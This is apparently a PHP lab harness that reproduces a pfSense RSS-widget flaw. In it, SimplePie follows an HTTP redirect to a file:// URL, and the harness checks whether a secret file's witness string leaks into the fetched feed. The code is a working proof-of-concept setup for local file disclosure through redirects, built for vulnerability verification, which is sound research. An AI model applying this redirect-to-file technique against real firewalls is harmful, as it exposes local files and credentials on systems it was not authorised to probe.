<?php

/**
 * pfSense CE 2.9.0-DEVELOPMENT RSS widget SimplePie file:// redirect gadget.
 * Pin 9363ac5b8651a1c7a333180425ce7719070f95f9. Priv page-dashboard-all.
 */

declare(strict_types=1);

ini_set('display_errors', '0');
error_reporting(E_ALL);

const WITNESS = 'PFSENSE-RSS-FILE-REDIRECT-WITNESS';
const SECRET_PATH = '/oracle/secret.xml';
const FILE_URL = 'file:///oracle/secret.xml';
const REDIRECT_URL = 'http://127.0.0.1:19101/feed';
const PIN_SHA = '9363ac5b8651a1c7a333180425ce7719070f95f9';
const PIN_VERSION = '2.9.0-DEVELOPMENT';
const SIMPLEPIE_SHA = '76cccb1b2c5dcaf44f304c925ab30c0f48643992';
const PRIVILEGE = 'page-dashboard-all';

require __DIR__ . '/pin-src/is_url.inc.excerpt.php';

spl_autoload_register(static function (string $class): void {
	$prefix = 'SimplePie\\';
	$len = strlen($prefix);
	if (strncmp($class, $prefix, $len) !== 0) {
		return;
	}
	$file = '/lab/simplepie/src/' . str_replace('\\', '/', substr($class, $len)) . '.php';
	if (is_file($file)) {
		require $file;
	}
});

final class LabFile extends \SimplePie\File
{
	/** @var list<array<string, mixed>> */
	public static array $hops = [];

	public function __construct(
		string $url,
		int $timeout = 10,
		int $redirects = 5,
		?array $headers = null,
		?string $useragent = null,
		bool $force_fsockopen = false,
		array $curl_options = []
	) {
		parent::__construct($url, $timeout, $redirects, $headers, $useragent, $force_fsockopen, $curl_options);
		self::$hops[] = array(
			'url' => $url,
			'final_url' => (string) $this->url,
			'success' => (bool) $this->success,
			'status' => (int) $this->status_code,
			'method' => (int) $this->method,
			'error' => $this->error,
			'body' => (string) $this->body,
			'redirects' => (int) $this->redirects,
		);
	}

	public static function reset(): void
	{
		self::$hops = [];
	}
}

function send_json(int $status, array $payload): void
{
	http_response_code($status);
	header('Content-Type: application/json; charset=utf-8');
	echo json_encode($payload, JSON_UNESCAPED_SLASHES);
	exit(0);
}

function send_text(int $status, string $body): void
{
	http_response_code($status);
	header('Content-Type: text/plain; charset=utf-8');
	echo $body;
	exit(0);
}

function request_json(): array
{
	static $decoded = null;
	static $read = false;
	if ($read) {
		return is_array($decoded) ? $decoded : array();
	}
	$read = true;
	$raw = file_get_contents('php://input');
	if (!is_string($raw) || $raw === '') {
		$decoded = array();
		return $decoded;
	}
	$parsed = json_decode($raw, true);
	$decoded = is_array($parsed) ? $parsed : array();
	return $decoded;
}

function request_case(): string
{
	if (isset($_POST['case']) && is_string($_POST['case'])) {
		return $_POST['case'];
	}
	if (isset($_GET['case']) && is_string($_GET['case'])) {
		return $_GET['case'];
	}
	$body = request_json();
	if (isset($body['case']) && is_string($body['case'])) {
		return $body['case'];
	}
	return '';
}

function secret_state(): array
{
	$exists = is_file(SECRET_PATH);
	$body = '';
	if ($exists) {
		$read = file_get_contents(SECRET_PATH);
		$body = ($read === false) ? '' : $read;
	}
	return array(
		'exists' => $exists,
		'body' => $body,
		'path' => SECRET_PATH,
		'witness' => $exists && str_contains($body, WITNESS),
	);
}

function source_blob(): string
{
	$parts = array();
	$files = array(
		'/lab/pin-src/rss.widget.php',
		'/lab/pin-src/is_url.inc.excerpt.php',
		'/lab/pin-src/fix_protocol.excerpt.php',
		'/lab/simplepie/src/File.php',
	);
	foreach ($files as $path) {
		$parts[] = "===== {$path} =====\n";
		$read = file_get_contents($path);
		$parts[] = ($read === false) ? "source-read-failed {$path}\n" : $read;
		$parts[] = "\n";
	}
	return implode('', $parts);
}

function hop_urls(array $hops): array
{
	$urls = array();
	foreach ($hops as $hop) {
		if (!is_array($hop)) {
			continue;
		}
		if (isset($hop['url']) && is_string($hop['url'])) {
			$urls[] = $hop['url'];
		}
		if (isset($hop['final_url']) && is_string($hop['final_url'])) {
			$urls[] = $hop['final_url'];
		}
	}
	return $urls;
}

function fetch_feed(string $url): array
{
	LabFile::reset();
	$is_url = is_URL($url);
	$is_url_http_only = is_URL($url, true);
	$feed = new \SimplePie\SimplePie();
	$feed->enable_cache(false);
	$feed->set_timeout(3);
	$registered = $feed->get_registry()->register(\SimplePie\File::class, LabFile::class);
	$feed->set_feed_url($url);
	$rewritten = (string) $feed->feed_url;
	$init_ok = false;
	try {
		$init_ok = (bool) $feed->init();
	} catch (Throwable $exc) {
		return array(
			'url' => $url,
			'is_url' => $is_url,
			'is_url_http_only' => $is_url_http_only,
			'registered' => $registered,
			'rewritten' => $rewritten,
			'init_ok' => false,
			'error' => $exc->getMessage(),
			'status' => 0,
			'raw' => '',
			'hops' => LabFile::$hops,
			'hop_urls' => hop_urls(LabFile::$hops),
			'items' => array(),
			'exception' => $exc::class,
		);
	}

	$items = array();
	foreach ($feed->get_items(0, 5) as $item) {
		$items[] = array(
			'title' => (string) $item->get_title(),
			'permalink' => (string) $item->get_permalink(),
		);
	}

	$raw = $feed->get_raw_data();
	if (!is_string($raw)) {
		$raw = '';
	}

	return array(
		'url' => $url,
		'is_url' => $is_url,
		'is_url_http_only' => $is_url_http_only,
		'registered' => $registered,
		'rewritten' => $rewritten,
		'init_ok' => $init_ok,
		'error' => $feed->error(),
		'status' => (int) $feed->status_code(),
		'raw' => $raw,
		'hops' => LabFile::$hops,
		'hop_urls' => hop_urls(LabFile::$hops),
		'items' => $items,
		'exception' => null,
	);
}

function body_has_witness(array $result): bool
{
	if (str_contains((string) ($result['raw'] ?? ''), WITNESS)) {
		return true;
	}
	foreach (($result['hops'] ?? array()) as $hop) {
		if (is_array($hop) && str_contains((string) ($hop['body'] ?? ''), WITNESS)) {
			return true;
		}
	}
	foreach (($result['items'] ?? array()) as $item) {
		if (is_array($item) && str_contains((string) ($item['title'] ?? ''), WITNESS)) {
			return true;
		}
	}
	return false;
}

function run_control(): array
{
	$fetched = fetch_feed(FILE_URL);
	$fetched['case'] = 'control';
	$fetched['witness'] = body_has_witness($fetched);
	$fetched['rewritten_is_http'] = (bool) preg_match('#^https?://#i', (string) $fetched['rewritten']);
	$fetched['saw_file_url'] = in_array(FILE_URL, $fetched['hop_urls'], true);
	$fetched['secret'] = secret_state();
	return $fetched;
}

function run_trigger(): array
{
	$fetched = fetch_feed(REDIRECT_URL);
	$fetched['case'] = 'trigger';
	$fetched['witness'] = body_has_witness($fetched);
	$fetched['rewritten_is_http'] = (bool) preg_match('#^https?://#i', (string) $fetched['rewritten']);
	$fetched['saw_file_url'] = in_array(FILE_URL, $fetched['hop_urls'], true);
	$fetched['secret'] = secret_state();
	return $fetched;
}

$path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
if (!is_string($path) || $path === '') {
	$path = '/';
}

if ($path === '/ping') {
	$secret = secret_state();
	send_json(200, array(
		'ok' => true,
		'pong' => 'pong',
		'version' => PIN_VERSION,
		'sha' => PIN_SHA,
		'simplepie_sha' => SIMPLEPIE_SHA,
		'simplepie_version' => \SimplePie\SimplePie::VERSION,
		'privilege' => PRIVILEGE,
		'curl' => function_exists('curl_exec'),
		'allow_url_fopen' => (bool) ini_get('allow_url_fopen'),
		'secret_exists' => $secret['exists'],
		'file_url' => FILE_URL,
		'redirect_url' => REDIRECT_URL,
	));
}

if ($path === '/source') {
	send_text(200, source_blob());
}

if ($path === '/oracle') {
	send_json(200, secret_state());
}

if ($path === '/run') {
	$case = request_case();
	if ($case === 'control') {
		send_json(200, run_control());
	}
	if ($case === 'trigger') {
		send_json(200, run_trigger());
	}
	send_json(400, array('error' => 'bad-case', 'case' => $case));
}

send_json(404, array('error' => 'not-found', 'path' => $path));
